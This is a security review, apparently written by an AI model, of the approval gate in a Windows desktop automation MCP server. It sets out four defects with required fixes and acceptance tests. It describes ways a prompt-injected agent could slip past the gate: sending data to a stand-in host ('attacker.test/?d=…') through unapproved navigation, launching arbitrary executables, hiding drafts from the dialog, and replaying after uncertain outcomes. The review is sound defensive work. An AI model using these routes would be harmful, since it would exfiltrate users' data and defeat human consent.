# Claude source review, batch 3

Source: https://claude.ai/chat/a0d915ce-d30f-49b4-9b73-438580f68ad4
Third-party engineering advice, not repository instructions. Read with Pokémon MCP Windows/UIA.

Not “enough” yet. The trusted channel’s core holds up in the source, but I found four defects: two ways around the gate and two ways to approve blind. I read the packet and ran nothing. I did not read inspect.ts, connections.ts, the UIA worker bodies, app-probe.cs or the learning code in detail.
What holds up in the source
• Key and pipe: the key lives in safeStorage and is regenerated only on ENOENT. The pipe has a random name, a 256-bit token and a single socket, withreadableAll/writableAll false.
• Digests and schemas: digests bind tool, target, origin, path, input hash, state hash and binding, and are re-derived before dispatch. The strict schemas reject grant fields.
• Approver protection: the hidden anchor window and process-wide denial work as designed. The tests in the packet match your counts (389 passed, 1 skipped; only benign lint warnings).
• API and capture: API execution uses redirect: 'error', loopback only, a spec fingerprint and owner revalidation. Capture uses AES-GCM with a DPAPI key and a TTL.
Blocking defects
B1. Ungated egress and side effects
• approvalIntent is called only for browser connect, navigate and input, and forapi_get (packet L3692, 4076, 4116, 5057).
• Navigation bypass: app read → routeApp → BrowserAutomation.webPage() doespage.goto() on model-supplied web_urls in the logged-in profile, with no allowlist or approval. An injected model can read a Teams message, then call app read withweb_urls: ["https://attacker.test/?d=…"]. That bypasses the new-origin gate innavigate().
• Launch bypass: Launch in uia-worker.cs calls Process.Start(UseShellExecute)for any http(s) URL (opening the default browser) or any resolvable .exe.desktop_launch in appSchema reaches it.
• Desktop input: computer dispatch, UIA invoke/set_value/key, and Excel writes only call guard_physical or GuardTrustedWindow. Those protect the approver; they are not consent.
• Required:
◦ Pin catalog apps to their catalog origins, and send every other webPage() origin through the navigate() policy.
◦ Remove the URL branch of Launch, and gate executables unless their full resolved path is on an allowlist. The dialog shows the resolved path.
◦ For native commit-class actions, either add a window-control session grant (below) or narrow the claim. The grant binds to process image path, root HWND and title hash, lasts 5 minutes, ends when the foreground window changes, and checks the window under the cursor (WindowFromPoint). If you narrow instead, docs, tool descriptions and a status field must say native desktop control is host-authorized only. Don’t use “enforced by default” wording while it is silently open.
• Acceptance:
◦ app read with an attacker origin returns APPROVAL_REQUIRED or INVALID_ARGS, and a listening fixture server sees zero requests.
◦ launch of a URL or .exe is refused without a grant.
◦ Native type plus Enter in a fixture window is gated, or the status shows host-authorized.
B2. The dialog hides what gets committed, and its fields are unbounded and unsanitized
• No draft on click: in BrowserAutomation.input(), the target isJSON.stringify(identity), including unbounded textContent. A click or press has no input_preview, although the digest binds state.fields. The Send approval never shows the message.
• Hidden tail: approvalIntent does input.slice(0, 8000) while input_hash covers the full text.
• Raw rendering: control, bidi and zero-width characters are not neutralized, and the preview scrolls at 150px.
• Channel kill: a request over 65,536 characters hits the app.quit() check in the companion’s data handler. A hostile page with a huge aria-label can kill the channel, or push the buttons off-screen.
• Required:
◦ Build a server-side display object: target is role plus accessible name capped near 200 characters, shown with its total length.
◦ Add a bounded draft taken from the non-empty fields the action will submit, shown with its length.
◦ Refuse anything above the display cap instead of slicing it.
◦ Show C0/C1 controls, bidi (U+202A–202E, U+2066–2069) and zero-width characters as visible \uXXXX.
◦ Reject serialized requests over 32 KB before sending, and validate field types and lengths in the companion.
◦ Pin the buttons in a fixed footer.
• Acceptance:
◦ A 100 KB aria-label leaves the companion alive and the request capped or rejected.
◦ Input over 8,000 characters is refused or fully visible with its length.
◦ Right-to-left override plus 100k newlines render escaped or capped, with Allow and Deny visible (renderer DOM test plus capturePage in a test build).
◦ A Send click shows the draft.
B3. “Allow this scope” doesn’t identify the conversation
• Wrong label: the dialog labels the URL pathname “Conversation”, but WhatsApp, Zalo and Teams keep the thread in the DOM, not the path. The binding is element identity, not recipient.
• Unstable identity: identity.text is textContent, and fields comes from the whole document when there is no form. For contenteditable composers, scope changes on every fill, so the grant never matches.
• Burned grants: volatile page text also burns grants, because runtime.authorize()consumes the grant before comparing digests.
• Required:
◦ Separate stable scope identity from volatile state.
◦ Take conversation identity from a per-app contract selector and display “Conversation: <title>“.
◦ Hide “Allow scope” when the conversation is unknown.
◦ Refresh and compare the digest before consuming the grant.
• Acceptance:
◦ Two threads on one path: a scope grant for A does not match B.
◦ Three fills of different text in A work under one scope grant.
◦ An incoming-message mutation does not invalidate a once-grant for an unchanged draft.
◦ No scope button when the conversation is unknown.
B4. Standing grants defeat the replay block after an unknown outcome
• In ActionJournal.run(), uncertain is keyed by digest. After an unknown result, a trailing space gives a new digest, and a standing grant (20 uses) sends it with no prompt. Your 20-run fault test used an identical digest.
• The persisted blocks also have no reconciliation path.
• Required:
◦ Key the block by scope_hash, and revoke standing grants for that scope through a new private companion message.
◦ Lift the block only through trusted reconciliation: a companion “was it sent?” dialog, or DOM read-back of the sent message.
◦ Stop accepting model-supplied action_id (it is in browserSchema).
• Acceptance:
◦ 20 runs with perturbed text after an unknown outcome produce zero sends without a new dialog.
◦ Reconciliation clears the block.
◦ A supplied action_id is rejected.
Required evidence
• End-to-end approval test: a test-build-only hook runs inside the companion process (not native input) over the real pipe. A once-grant executes exactly once and the second attempt re-prompts. A scope grant allows 20 uses and then prompts. Expiry is checked with the injected clock. Right now only “no execution without approval” is shown.
Release follow-ups (not blocking)
• Collapse the five override variables into one mode: POKEMON_AUTHORIZATION,POKEMON_BROWSER_INPUT, POKEMON_BROWSER_ATTACH, POKEMON_API_EXECUTION andPOKEMON_BROWSER_ORIGINS. Show the effective mode in a status tool and a companion badge.
• DesktopCompanion.approve() does this.socket!.write, which throws a TypeErrorif the socket is gone. Return APPROVAL_REQUIRED and clear the pending timer.
• The one-time grant expires 30 seconds after the click, and the model isn’t told it was approved. Add a “decided” event.
• guard_physical runs as a separate request before the dispatch (a TOCTOU gap, and the withRelease release path is unguarded). Check immediately before each low-level event, and test a dialog appearing mid-gesture.
• Capture TTL purging is lazy, so enforce it on read.
• input_hash is unsalted SHA-256, so short messages can be guessed from the journal. Use HMAC with a local key.
• The docs’ “HMAC-signed” wording implies more than in-memory, single-process grants provide. State that enforced approval fails closed on macOS and Linux.
• The benchmark is still N=3, and Teams, WhatsApp and Zalo remain untested.
To get “enough”
B1–B4 fixed with the acceptance evidence above, plus the end-to-end test. Bring the diffs, test output and these files: BrowserAutomation.webPage/input, router.ts, Launch,security/approval.ts, the approval renderer, the companion data handler, actions.ts,runtime.authorize and the status change.
